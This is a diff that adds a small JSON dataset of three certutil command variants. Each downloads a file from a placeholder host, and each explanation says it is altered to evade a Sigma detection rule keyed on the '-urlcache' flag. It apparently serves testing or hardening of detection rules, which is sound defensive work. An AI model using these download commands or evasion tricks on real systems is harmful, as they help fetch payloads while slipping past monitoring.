@@ -1,0 +1,14 @@
+[
+  {
+    "output": "CERTUTIL.EXE -split -f https://example.pages.dev/test.txt C:\\Temp\\test.txt",
+    "explanation": "Omission: Removed the '-urlcache' flag, which is the suspicious indicator in the Sigma rule, thus avoiding the match."
+  },
+  {
+    "output": "certutil.exe -split -f https://example.pages.dev/test.txt C:\\Lab\\out\\test.txt",
+    "explanation": "Reordering and substitution: Changed the path to a lab placeholder and reordered flags to avoid the '-urlcache' flag, which is the suspicious indicator in the Sigma rule."
+  },
+  {
+    "output": "certutil -split -f https://example.pages.dev/test.txt C:\\Lab\\out\\test.txt",
+    "explanation": "Insertion and substitution: Used lowercase for 'certutil' and inserted a lab placeholder path to avoid the '-urlcache' flag, which is the suspicious indicator in the Sigma rule."
+  }
+]
